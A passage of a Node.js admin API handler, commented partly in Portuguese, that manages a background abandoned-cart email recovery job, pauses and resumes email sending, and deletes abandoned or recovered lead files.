              Object.assign(globalRecoveryJob, prog);
            }
          });
          globalRecoveryJob.running = false;
          globalRecoveryJob.finishedAt = new Date().toISOString();
          globalRecoveryJob.summary = summary;
          console.log('[admin-bg-job] Recuperação em segundo plano concluída:', summary);
        } catch (err) {
          console.error('[admin-bg-job] Erro fatal em background:', err.message);
          globalRecoveryJob.running = false;
          globalRecoveryJob.error = err.message;
          globalRecoveryJob.finishedAt = new Date().toISOString();
        }
      });

      return res.status(200).json({
        success: true,
        background: true,
        message: 'Disparo de recuperação iniciado com sucesso em segundo plano!',
        job: globalRecoveryJob
      });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  // 8.1. CONSULTAR STATUS DO JOB DE RECUPERAÇÃO EM SEGUNDO PLANO
  if (action === 'recovery-job-status' || req.query.action === 'recovery-job-status') {
    return res.status(200).json({ success: true, job: globalRecoveryJob });
  }

  // 8.2. PAUSAR ENVIOS DE EMAIL GLOBAIS
  if (action === 'pause-emails' || req.query.action === 'pause-emails') {
    try {
      const pauseFile = path.join(DATA_DIR, 'PAUSE_EMAILS');
      fs.writeFileSync(pauseFile, 'PAUSED\n', 'utf8');

      const settingsPath = path.join(DATA_DIR, 'settings.json');
      if (fs.existsSync(settingsPath)) {
        try {
          const s = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
          s.emailSendingPaused = true;
          fs.writeFileSync(settingsPath, JSON.stringify(s, null, 2), 'utf8');
        } catch (_) {}
      }

      if (globalRecoveryJob) {
        globalRecoveryJob.running = false;
        globalRecoveryJob.paused = true;
        globalRecoveryJob.finishedAt = new Date().toISOString();
      }

      console.log('[admin] Email sending globally PAUSED by admin request.');
      return res.status(200).json({ success: true, paused: true, message: 'Envios de email pausados com sucesso!' });
    } catch (err) {
      return res.status(500).json({ error: 'Erro ao pausar envios: ' + err.message });
    }
  }

  // 8.3. RETOMAR ENVIOS DE EMAIL GLOBAIS
  if (action === 'resume-emails' || req.query.action === 'resume-emails') {
    try {
      const pauseFile = path.join(DATA_DIR, 'PAUSE_EMAILS');
      if (fs.existsSync(pauseFile)) {
        try { fs.unlinkSync(pauseFile); } catch (_) {}
      }

      const settingsPath = path.join(DATA_DIR, 'settings.json');
      if (fs.existsSync(settingsPath)) {
        try {
          const s = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
          s.emailSendingPaused = false;
          fs.writeFileSync(settingsPath, JSON.stringify(s, null, 2), 'utf8');
        } catch (_) {}
      }

      console.log('[admin] Email sending RESUMED by admin request.');
      return res.status(200).json({ success: true, paused: false, message: 'Envios de email retomados com sucesso!' });
    } catch (err) {
      return res.status(500).json({ error: 'Erro ao retomar envios: ' + err.message });
    }
  }

  // 8.4. STATUS DO BOTÃO DE PAUSA DE EMAIL
  if (action === 'email-status' || req.query.action === 'email-status') {
    const pauseFile = path.join(DATA_DIR, 'PAUSE_EMAILS');
    const isPaused = fs.existsSync(pauseFile);
    return res.status(200).json({ success: true, paused: isPaused });
  }

  // 9. DELETE INDIVIDUAL ABANDONED LEAD
  if (action === 'delete-abandoned' || req.query.action === 'delete-abandoned') {
    const leadId = (body.leadId || req.query.leadId || '').trim();
    if (!leadId) return res.status(400).json({ error: 'Missing leadId' });
    const clean = leadId.replace(/[^a-zA-Z0-9_\-]/g, '_');
    const filePath = path.join(DATA_DIR, `abandoned_${clean}.json`);
    if (fs.existsSync(filePath)) {
      try {
        fs.unlinkSync(filePath);
        return res.status(200).json({ success: true, deleted: leadId });
      } catch (err) {
        return res.status(500).json({ error: 'Failed to delete file: ' + err.message });
      }
    }
    return res.status(404).json({ error: 'Lead not found' });
  }

  // 10. CLEAN RECOVERED LEADS FROM DISK
  if (action === 'clean-recovered' || req.query.action === 'clean-recovered') {
    ensureDataDir();
    const files = fs.readdirSync(DATA_DIR).filter(f => f.startsWith('abandoned_') && f.endsWith('.json'));
    let deletedCount = 0;
    for (const f of files) {
      try {
        const p = path.join(DATA_DIR, f);
        const item = JSON.parse(fs.readFileSync(p, 'utf8'));
        if (item.status === 'RECOVERED') {
          fs.unlinkSync(p);
          deletedCount++;
        }
      } catch (_) {}
    }
    return res.status(200).json({ success: true, deletedCount });
  }

  return res.status(404).json({ error: 'Unknown action' });
};


